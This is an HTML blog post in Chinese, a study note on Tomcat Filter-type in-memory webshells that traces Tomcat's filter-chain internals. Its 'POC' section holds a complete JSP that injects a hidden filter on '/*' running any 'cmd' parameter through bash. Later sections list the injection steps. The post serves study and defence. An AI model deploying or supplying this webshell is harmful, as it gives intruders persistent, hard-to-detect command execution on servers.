@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="images/favicon.ico">
+  <title>java Filter内存马 | fmyyy</title>
+  <meta name="author" content="fmyyy" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="" />
+  
+  <meta name="description" content="java Filter内存马去补了点之前javaweb的知识回来看内存马 Tomcat内存马主要利用了Tomcat的部分组件会在内存中长期驻留的特性，只要将我们的恶意组件注入其中，就可以一直生效，直到容器重启。 javaweb三大组件Servlet　　在Java web b&#x2F;s架构中，servlet扮演了重要的角色，作为一个中转处理的容器，他连接了客户端和服务器端的信息交互和处理。简单来说，客户端">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java Filter内存马">
+<meta property="og:url" content="https://fmyyy.gitee.io/2021/11/21/java%20Filter%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="fmyyy">
+<meta property="og:description" content="java Filter内存马去补了点之前javaweb的知识回来看内存马 Tomcat内存马主要利用了Tomcat的部分组件会在内存中长期驻留的特性，只要将我们的恶意组件注入其中，就可以一直生效，直到容器重启。 javaweb三大组件Servlet　　在Java web b&#x2F;s架构中，servlet扮演了重要的角色，作为一个中转处理的容器，他连接了客户端和服务器端的信息交互和处理。简单来说，客户端">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
+<meta property="article:published_time" content="2021-11-21T01:14:04.000Z">
+<meta property="article:modified_time" content="2021-12-02T04:34:05.118Z">
+<meta property="article:author" content="fmyyy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/hf1.jpg');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>归档</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>Friends</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/fmyyy1">CSDN</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>联系</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a href="/null">QQ:254005846</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">fmyyy</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>fmyyy</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center">java Filter内存马</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><i class="fa fa-calendar"></i> 2021-11-21</li>
+                <li><i class="fa fa-user"></i> 作者 fmyyy</li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~8.87K
+                    
+                    字
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                本文最后编辑于 <time datetime="1638419645118"></time> 前，其中的内容可能需要更新。
+            </div>
+            
+                <div class="kratos-post-inner-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java-Filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">java Filter内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#javaweb%E4%B8%89%E5%A4%A7%E7%BB%84%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">javaweb三大组件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet"><span class="toc-number">1.1.1.</span> <span class="toc-text">Servlet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Filter"><span class="toc-number">1.1.2.</span> <span class="toc-text">Filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Listener"><span class="toc-number">1.1.3.</span> <span class="toc-text">Listener</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.2.</span> <span class="toc-text">内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text">Filter内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">1.3.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FIlter%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">FIlter流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">内存马注入</span></a></li></ol></li></ol></li></ol>
+                </div>
+            
+            <hr />
+            <h1 id="java-Filter内存马"><a href="#java-Filter内存马" class="headerlink" title="java Filter内存马"></a>java Filter内存马</h1><p>去补了点之前javaweb的知识回来看内存马</p>
+<p>Tomcat内存马主要利用了Tomcat的部分组件会在内存中长期驻留的特性，只要将我们的恶意组件注入其中，就可以一直生效，直到容器重启。</p>
+<h2 id="javaweb三大组件"><a href="#javaweb三大组件" class="headerlink" title="javaweb三大组件"></a>javaweb三大组件</h2><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>　　在Java web b/s架构中，servlet扮演了重要的角色，作为一个中转处理的容器，他连接了<strong>客户端和服务器端的信息交互和处理</strong>。简单来说，客户端发送请求，传递到servlet容器，而servlet将数据转换成服务器端可以处理的数据再发送给服务器端，再数据处理之后，再传递到servlet容器，servlet再转译到客户端，完成了一次客户端和服务器端的信息交互。<br>　　Servlet是通过Java编写的，因为他也具备了Java的一些特点，比如跨平台性，可扩展性高，然而他的优点不仅仅是局限于语言方面，因为Servlet的出现，可以使我们将JSP页面中的一些JAVA代码移植到Servlet中来，可无疑使前端人员深受喜欢，方便了项目的修改完善，而Servlet的使用也是非常的简单。</p>
+<p>　　<strong>Servlet的生命周期</strong>有四个阶段，第一个阶段，实例化，会调用构造方法，第二个阶段是初始化，会调用init（）方法，第三个阶段是请求处理，调用service方法，第四个阶段，服务终止也就是销毁阶段，调用destroy方法。<br>　　前台如何将数据传递给Servlet？也是非常简单的，只需表单提交就可以轻松完成，Servlet可以使用request.getParameter来接受，传递给前台就可以使用request.setA什么的来赋值。<br>　　页面提交的时候有get和post两种方式，这俩种方式都会在Servlet中处理，如果是get则会调用doget，post则会dopost，而同时使用，只需要post调用doget方法就可以。</p>
+<h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p>　　filter用于拦截用户请求，在服务器作出响应前，可以在拦截后修改request和response，这样实现很多开发者想得到的功能。</p>
+<p>　　filter是一个可以复用的代码片段，可以用来转换HTTP请求、响应和头信息。Filter不像Servlet，它不能产生一个请求或者响应，它只是修改对某一资源的请求，或者修改从某一的响应。</p>
+<h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><p>Javaweb中的监听器是用于监听web常见对象HttpServletRequest,HttpSession,ServletContext</p>
+<p>1.监听web对象创建与销毁.</p>
+<p>2.监听web对象的属性变化</p>
+<p>3.监听session绑定javaBean操作.</p>
+<h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><p>随着攻防对抗的博弈愈发激烈，流量分析、EDR等专业安全设备被防守方广泛使用，传统的文件上传的webshll或以文件形式驻留的后门越来越容易被检测到，webshell终于进入内存马时代。</p>
+<p>内存马主要分为以下几类：</p>
+<ol>
+<li>servlet-api类</li>
+</ol>
+<ul>
+<li><ul>
+<li>filter型</li>
+</ul>
+</li>
+<li><ul>
+<li>servlet型</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>spring类</li>
+</ol>
+<ul>
+<li><ul>
+<li>拦截器</li>
+</ul>
+</li>
+<li><ul>
+<li>controller型</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>Java Instrumentation类</li>
+</ol>
+<ul>
+<li><ul>
+<li>agent型</li>
+</ul>
+</li>
+</ul>
+<h2 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> String name = <span class="string">&quot;KpLi0rn&quot;</span>;</span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    Field Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123;</span><br><span class="line">        Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">                HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    Process process = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="keyword">int</span> len = process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> String(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://img.le1a.com/2021/11/29/56283ddc72ee6.png" alt="1638192431209.png"></p>
+<h3 id="FIlter流程"><a href="#FIlter流程" class="headerlink" title="FIlter流程"></a>FIlter流程</h3><p>注册一个Servlet之后自定义一个Filter</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">filterDemo</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter 初始化创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行过滤操作&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在web.xml里注册filter</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>filter.filterDemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demo<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>启动tomcat是可以看到</p>
+<p><img src="http://img.le1a.com/2021/11/30/c09458629419d.png" alt="1638241046468.png"></p>
+<p>访问/demo</p>
+<p><img src="http://img.le1a.com/2021/11/30/b70ee19c837c5.png" alt="1638241114969.png"></p>
+<p>调试一下tomcat是如何调用我们自定义的Filter的</p>
+<p>有几个关键的类</p>
+<p><strong>FilterDefs</strong>：存放FilterDef的数组 ，<strong>FilterDef</strong> 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</p>
+<p><strong>FilterConfigs</strong>：存放filterConfig的数组，在 <strong>FilterConfig</strong> 中主要存放 FilterDef 和 Filter对象等信息</p>
+<p><strong>FilterMaps</strong>：存放FilterMap的数组，在 <strong>FilterMap</strong> 中主要存放了 FilterName 和 对应的URLPattern</p>
+<p><strong>FilterChain</strong>：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter</p>
+<p><strong>WebXml</strong>：存放 web.xml 中内容的类</p>
+<p><strong>ContextConfig</strong>：Web应用的上下文配置类</p>
+<p><strong>StandardContext</strong>：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper</p>
+<p><strong>StandardWrapperValve</strong>：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet</p>
+<p>在org.apache.catalina.startup.ContextConfig这个类的configureContext方法里面解析了web.xml</p>
+<p><img src="http://img.le1a.com/2021/11/30/39a7bced3a666.png" alt="1638245736692.png"></p>
+<p>来到StandardWrapperValve类里面，这里初始化了一个filterChain</p>
+<p><img src="http://img.le1a.com/2021/11/30/9d7f654edfdf3.png" alt="1638247946333.png"></p>
+<p>进入createFilterChain方法。</p>
+<p><img src="http://img.le1a.com/2021/11/30/2f936a0e0a7db.png" alt="1638253311916.png"></p>
+<p>这里先获取web应用context，再从中获取filterMap[]，里面能就能看到我们定义的filter的信息了</p>
+<p><img src="http://img.le1a.com/2021/11/30/5bc125bdb7850.png" alt="1638253616232.png"></p>
+<p>下面遍历了filterMaps进入if语句，里面有两个方法matchDispatcher和matchFiltersURL，如果发现符合当前请求 url 与 FilterMap 中的 urlPattern 相匹配，则会进入findFilterConfig方法</p>
+<p>![image-20211130143455233](/Users/fmyyy/Library/Application Support/typora-user-images/image-20211130143455233.png)</p>
+<p>从findFilterConfig方法获取配置返回FilterConfig</p>
+<p><img src="http://img.le1a.com/2021/11/30/5a7e12be29984.png" alt="1638254441486.png"></p>
+<p>如果不为null，则把filterConfig加入filterChain</p>
+<p>看addFilter</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addFilter</span><span class="params">(ApplicationFilterConfig filterConfig)</span> </span>&#123;</span><br><span class="line">    ApplicationFilterConfig[] newFilters = <span class="keyword">this</span>.filters;</span><br><span class="line">    <span class="keyword">int</span> var3 = newFilters.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">        ApplicationFilterConfig filter = newFilters[var4];</span><br><span class="line">        <span class="keyword">if</span> (filter == filterConfig) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.n == <span class="keyword">this</span>.filters.length) &#123;</span><br><span class="line">        newFilters = <span class="keyword">new</span> ApplicationFilterConfig[<span class="keyword">this</span>.n + <span class="number">10</span>];</span><br><span class="line">        System.arraycopy(<span class="keyword">this</span>.filters, <span class="number">0</span>, newFilters, <span class="number">0</span>, <span class="keyword">this</span>.n);</span><br><span class="line">        <span class="keyword">this</span>.filters = newFilters;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.filters[<span class="keyword">this</span>.n++] = filterConfig;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>逻辑很简单，遍历已有的filter判断当前filter是否已经存在，如果不存在则加入。</p>
+<p>回到StandardWrapperValve类下面调用了doFilter，</p>
+<p>![image-20211130145103086](/Users/fmyyy/Library/Application Support/typora-user-images/image-20211130145103086.png)</p>
+<p>跟进这个doFilter</p>
+<p><img src="http://img.le1a.com/2021/11/30/381120369b17a.png" alt="1638255114086.png"></p>
+<p>调用了internalDofilter</p>
+<p><img src="http://img.le1a.com/2021/11/30/b39c4fc1811fd.png" alt="1638255364232.png"></p>
+<p>internalDofilter里面调用getFilter获取filter之后下面调用其doFilter方法，所以来到了我们自定义的doFilter方法里面。</p>
+<h3 id="内存马注入"><a href="#内存马注入" class="headerlink" title="内存马注入"></a>内存马注入</h3><p>我们的请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行，当我们在 filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存 Webshell</p>
+<p>入手点再组装过滤链的部分</p>
+<p><img src="http://img.le1a.com/2021/11/30/7f0b24f0a0dfd.png" alt="1638258384716.png"></p>
+<p>在createFilterChain方法里面生成过context即StandardContext类，就是一个web应用</p>
+<p>所以要想办法获取这个context，获取这个context的方法有很多，想之后再单独记一篇笔记。</p>
+<p>获取到context之后能看到三个重要的属性</p>
+<p><img src="http://img.le1a.com/2021/11/30/ffdb6f518ed4c.png" alt="1638268944031.png"></p>
+<p>前面贴过了这三个属性的作用，再放一遍</p>
+<p><strong>FilterDefs</strong>：存放FilterDef的数组 ，<strong>FilterDef</strong> 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</p>
+<p><strong>FilterConfigs</strong>：存放filterConfig的数组，在 <strong>FilterConfig</strong> 中主要存放 FilterDef 和 Filter对象等信息</p>
+<p><strong>FilterMaps</strong>：存放FilterMap的数组，在 <strong>FilterMap</strong> 中主要存放了 FilterName 和 对应的URLPattern</p>
+<p>大致流程如下：</p>
+<ol>
+<li><p>创建一个恶意 Filter</p>
+</li>
+<li><p>利用 FilterDef 对 Filter 进行一个封装</p>
+</li>
+<li><p>将 FilterDef 添加到 FilterDefs 和 FilterConfig</p>
+</li>
+<li><p>创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）</p>
+</li>
+</ol>
